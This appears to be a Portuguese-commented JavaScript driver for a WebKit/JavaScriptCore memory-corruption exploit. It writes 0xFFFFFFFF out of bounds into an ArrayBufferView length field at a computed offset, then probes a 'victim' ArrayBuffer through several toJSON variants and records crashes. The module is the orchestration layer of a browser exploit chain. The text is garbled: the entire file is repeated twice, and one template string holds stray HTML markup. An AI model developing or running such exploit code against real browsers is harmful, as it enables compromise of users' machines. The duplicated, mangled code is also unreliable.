// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeVictimABProbeTest,
    toJSON_V25_BaseProbe,
    toJSON_V25_A_AccessByteLength,
    toJSON_V25_B_AccessNonExistentProp,
    toJSON_V25_C_ObjectKeys,
    FNAME_MODULE // Importando FNAME_MODULE para usar no título
} from './testVictimABInteractionAfterCorruption.mjs'; 
// CORREÇÃO: Importar JSC_OFFSETS de config.mjs
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; 
import { toHex } from '../utils.mjs';

async function runMinimalVictimProbingStrategy() {
    const FNAME_RUNNER = "runMinimalVictimProbingStrategy";
    logS3(`==== INICIANDO Estratégia de Sondagem Mínima em victim_ab Pós-Corrupção ====`, 'test', FNAME_RUNNER);

    // Definição do offset de corrupção aqui, usando JSC_OFFSETS importado
    const FAKE_VIEW_BASE_OFFSET_IN_OOB_local = 0x58; // Constante local se FAKE_VIEW_BASE_OFFSET_IN_OOB não for exportada
    const mLengthOffsetInView = parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);

    if (isNaN(mLengthOffsetInView)) {
        logS3("ERRO CRÍTICO: JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET não é um número válido em config.mjs.", "critical", FNAME_RUNNER);
        return;
    }
    const criticalCorruptionTarget = FAKE_VIEW_BASE_OFFSET_IN_OOB_local + mLengthOffsetInView; 
    const criticalValue = 0xFFFFFFFF;

    logS3(`   Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(criticalCorruptionTarget)}`, "info", FNAME_RUNNER);

    const toJSON_variants_to_test = [
        { name: "V25_BaseProbe (toString.call only)", func: toJSON_V25_BaseProbe },
        { name: "V25_A_AccessByteLength", func: toJSON_V25_A_AccessByteLength },
        { name: "V25_B_AccessNonExistentProp", func: toJSON_V25_B_AccessNonExistentProp },
        { name: "V25_C_ObjectKeys", func: toJSON_V25_C_ObjectKeys }
    ];

    for (const variant of toJSON_variants_to_test) {
        const test_desc = `VictimProbe_OOB@<span class="math-inline">\{toHex\(criticalCorruptionTarget\)\}\_Val</span>{toHex(criticalValue)}_toJSON-${variant.name}`;
        logS3(`\n--- Sub-Teste: ${test_desc} ---`, 'subtest', FNAME_RUNNER);

        const result = await executeVictimABProbeTest(
            test_desc,
            variant.func,
            criticalCorruptionTarget,
            criticalValue
        );

        if (result.errorOccurred) {
            logS3(`   RESULTADO ${variant.name}: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
            document.title = `ERR ${variant.name}`;
        } else if (result.potentiallyCrashed) {
             logS3(`   RESULTADO ${variant.name}: CONGELAMENTO POTENCIAL.`, "error", FNAME_RUNNER);
             if (!document.title.includes("CONGELOU")) document.title = `CRASH? ${variant.name}`;
        } else {
            logS3(`   RESULTADO ${variant.name}: Completou. Detalhes da toJSON: ${JSON.stringify(result.toJSON_results)}`, "good", FNAME_RUNNER);
             if (result.toJSON_results && result.toJSON_results.error) {
                logS3(`     ERRO INTERNO NA toJSON: ${result.toJSON_results.error}`, "warn", FNAME_RUNNER);
                document.title = `toJSON_ERR ${variant.name}`;
             } else if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE) || document.title.includes("Sondando")) {
                document.title = `${variant.name} OK`;
             }
        }
        logS3(`   Título da página ao final de ${variant.name}: ${document.title}`, "info");

        if (document.title.includes("CRASH") || document.title.includes("CONGELOU")) {
            logS3("Problema sério detectado. Interrompendo mais variantes de toJSON.", "error", FNAME_RUNNER);
            break;
        }
        await PAUSE_S3(MEDIUM_PAUSE_S3);
    }
    logS3(`==== Estratégia de Sondagem Mínima em victim_ab CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE}_MainOrchestrator_v25.1`; 
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Sondagem Mínima em victim_ab Pós-Corrupção ====`, 'test', FNAME_ORCHESTRATOR);

    await runMinimalVictimProbingStrategy();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    // Título final já deve ter sido ajustado pela sub-função ou loop.
     if (document.title.startsWith("Iniciando") || document.title.includes("Sondando")) {
        if (!document.title.includes("CRASH") && !document.title.includes("PROBLEM") && !document.title.includes("SUCCESS") && !document.title.includes("ERR")) {
            document.title = `${FNAME_MODULE} (v25.1) Concluído`;
        }
    }
}// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeVictimABProbeTest,
    toJSON_V25_BaseProbe,
    toJSON_V25_A_AccessByteLength,
    toJSON_V25_B_AccessNonExistentProp,
    toJSON_V25_C_ObjectKeys,
    FNAME_MODULE // Importando FNAME_MODULE para usar no título
} from './testVictimABInteractionAfterCorruption.mjs'; 
// CORREÇÃO: Importar JSC_OFFSETS de config.mjs
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; 
import { toHex } from '../utils.mjs';

async function runMinimalVictimProbingStrategy() {
    const FNAME_RUNNER = "runMinimalVictimProbingStrategy";
    logS3(`==== INICIANDO Estratégia de Sondagem Mínima em victim_ab Pós-Corrupção ====`, 'test', FNAME_RUNNER);

    // Definição do offset de corrupção aqui, usando JSC_OFFSETS importado
    const FAKE_VIEW_BASE_OFFSET_IN_OOB_local = 0x58; // Constante local se FAKE_VIEW_BASE_OFFSET_IN_OOB não for exportada
    const mLengthOffsetInView = parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);

    if (isNaN(mLengthOffsetInView)) {
        logS3("ERRO CRÍTICO: JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET não é um número válido em config.mjs.", "critical", FNAME_RUNNER);
        return;
    }
    const criticalCorruptionTarget = FAKE_VIEW_BASE_OFFSET_IN_OOB_local + mLengthOffsetInView; 
    const criticalValue = 0xFFFFFFFF;

    logS3(`   Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(criticalCorruptionTarget)}`, "info", FNAME_RUNNER);

    const toJSON_variants_to_test = [
        { name: "V25_BaseProbe (toString.call only)", func: toJSON_V25_BaseProbe },
        { name: "V25_A_AccessByteLength", func: toJSON_V25_A_AccessByteLength },
        { name: "V25_B_AccessNonExistentProp", func: toJSON_V25_B_AccessNonExistentProp },
        { name: "V25_C_ObjectKeys", func: toJSON_V25_C_ObjectKeys }
    ];

    for (const variant of toJSON_variants_to_test) {
        const test_desc = `VictimProbe_OOB@<span class="math-inline">\{toHex\(criticalCorruptionTarget\)\}\_Val</span>{toHex(criticalValue)}_toJSON-${variant.name}`;
        logS3(`\n--- Sub-Teste: ${test_desc} ---`, 'subtest', FNAME_RUNNER);

        const result = await executeVictimABProbeTest(
            test_desc,
            variant.func,
            criticalCorruptionTarget,
            criticalValue
        );

        if (result.errorOccurred) {
            logS3(`   RESULTADO ${variant.name}: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
            document.title = `ERR ${variant.name}`;
        } else if (result.potentiallyCrashed) {
             logS3(`   RESULTADO ${variant.name}: CONGELAMENTO POTENCIAL.`, "error", FNAME_RUNNER);
             if (!document.title.includes("CONGELOU")) document.title = `CRASH? ${variant.name}`;
        } else {
            logS3(`   RESULTADO ${variant.name}: Completou. Detalhes da toJSON: ${JSON.stringify(result.toJSON_results)}`, "good", FNAME_RUNNER);
             if (result.toJSON_results && result.toJSON_results.error) {
                logS3(`     ERRO INTERNO NA toJSON: ${result.toJSON_results.error}`, "warn", FNAME_RUNNER);
                document.title = `toJSON_ERR ${variant.name}`;
             } else if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE) || document.title.includes("Sondando")) {
                document.title = `${variant.name} OK`;
             }
        }
        logS3(`   Título da página ao final de ${variant.name}: ${document.title}`, "info");

        if (document.title.includes("CRASH") || document.title.includes("CONGELOU")) {
            logS3("Problema sério detectado. Interrompendo mais variantes de toJSON.", "error", FNAME_RUNNER);
            break;
        }
        await PAUSE_S3(MEDIUM_PAUSE_S3);
    }
    logS3(`==== Estratégia de Sondagem Mínima em victim_ab CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE}_MainOrchestrator_v25.1`; 
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Sondagem Mínima em victim_ab Pós-Corrupção ====`, 'test', FNAME_ORCHESTRATOR);

    await runMinimalVictimProbingStrategy();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    // Título final já deve ter sido ajustado pela sub-função ou loop.
     if (document.title.startsWith("Iniciando") || document.title.includes("Sondando")) {
        if (!document.title.includes("CRASH") && !document.title.includes("PROBLEM") && !document.title.includes("SUCCESS") && !document.title.includes("ERR")) {
            document.title = `${FNAME_MODULE} (v25.1) Concluído`;
        }
    }
}
